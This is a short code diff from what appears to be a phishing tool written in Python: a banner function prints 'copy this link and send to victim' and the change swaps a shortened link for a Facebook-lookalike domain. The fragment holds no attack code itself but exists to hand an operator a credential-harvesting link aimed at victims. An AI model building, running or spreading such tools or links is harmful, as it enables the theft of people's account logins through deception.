@@ -21,4 +21,4 @@ def afficher_titre():
     print("")
     print("")
 
-    print("copy this link and send to victim : " + Fore.CYAN + " https://cutt.ly/SemVpaJu")
+    print("copy this link and send to victim : " + Fore.CYAN + "http://fasearbook.mywebcommunity.org/")
